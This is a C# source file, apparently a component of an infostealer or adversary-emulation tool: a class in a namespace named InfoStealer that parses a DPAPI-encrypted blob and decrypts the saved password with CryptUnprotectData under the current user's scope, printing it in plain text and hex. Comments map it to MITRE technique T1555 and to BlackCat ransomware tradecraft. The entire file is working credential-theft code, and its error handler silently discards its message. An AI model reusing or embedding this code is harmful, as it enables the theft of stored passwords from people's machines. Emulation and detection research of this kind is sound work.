using Microsoft.Data.SqlClient;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace InfoStealer
{
    internal class dpapi
    {
        /*
            * Name: DPAPI_decrypt
            * parameters: String password
            *  
            *  This function takes in a base64 encrypted DPAPI blob containing a password. The blob is decrypted using the DPAPI call CryptUnprotectData().
            *  Return: Hex representation of the decrpyted password is written to STDOUT.
            *
            *  MITRE ATT&CK Techniques:
            *  	- T1555 Credentials from Password Stores
            *
            *  CTI:
            *  	- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps
            *  	
            *  	References:
            *  	- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c
            *  	- https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/
             */
        public static void DPAPI_decrypt(String password)
        {
            Console.WriteLine("Decrypting DPAPI encrypted password: {0}", password);

            byte[] blobBytes;
            bool unprotect = true;         //CryptUnprotectData()
            byte[] entropy = null;

            blobBytes = Convert.FromBase64String(password);
            if (blobBytes.Length > 0)
            {
                var offset = 24;

                var guidMasterKeyBytes = new byte[16];
                Array.Copy(blobBytes, offset, guidMasterKeyBytes, 0, 16);
                var guidMasterKey = new Guid(guidMasterKeyBytes);
                var guidString = $"{{{guidMasterKey}}}";
                offset += 16;

                var flags = BitConverter.ToUInt32(blobBytes, offset);
                offset += 4;

                var descLength = BitConverter.ToInt32(blobBytes, offset);
                offset += 4;
                var description = Encoding.Unicode.GetString(blobBytes, offset, descLength);
                offset += descLength;

                var algCrypt = BitConverter.ToInt32(blobBytes, offset);
                offset += 4;

                var algCryptLen = BitConverter.ToInt32(blobBytes, offset);
                offset += 4;

                var saltLen = BitConverter.ToInt32(blobBytes, offset);
                offset += 4;

                var saltBytes = new byte[saltLen];
                Array.Copy(blobBytes, offset, saltBytes, 0, saltLen);
                offset += saltLen;

                var hmacKeyLen = BitConverter.ToInt32(blobBytes, offset);
                offset += 4 + hmacKeyLen;

                var algHash = BitConverter.ToInt32(blobBytes, offset);
                offset += 4;

                var algHashLen = BitConverter.ToInt32(blobBytes, offset);
                offset += 4;

                var hmac2KeyLen = BitConverter.ToInt32(blobBytes, offset);
                offset += 4 + hmac2KeyLen;

                var dataLen = BitConverter.ToInt32(blobBytes, offset);
                offset += 4;
                var dataBytes = new byte[dataLen];
                Array.Copy(blobBytes, offset, dataBytes, 0, dataLen);
                // use CryptUnprotectData()

                try
                {
                    byte[] decBytesRaw = ProtectedData.Unprotect(blobBytes, entropy, DataProtectionScope.CurrentUser);
                    if ((decBytesRaw != null) && (decBytesRaw.Length != 0))
                    {
                        string data = "";
                        int finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
                        if (finalIndex > 1)
                        {
                            byte[] decBytes = new byte[finalIndex + 1];
                            Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
                            data = Encoding.Unicode.GetString(decBytes);
                        }
                        else
                        {
                            data = Encoding.ASCII.GetString(decBytesRaw);
                        }
                        Console.WriteLine("    dec(blob)        : {0}", data);
                        string hexData = BitConverter.ToString(decBytesRaw).Replace("-", " ");
                        Console.WriteLine("    dec(blob) HEX        : {0}", hexData);
                    }
                }
                catch
                {
                     Encoding.Unicode.GetBytes($"MasterKey needed - {guidString}");
                }

            }
        }

    }
}

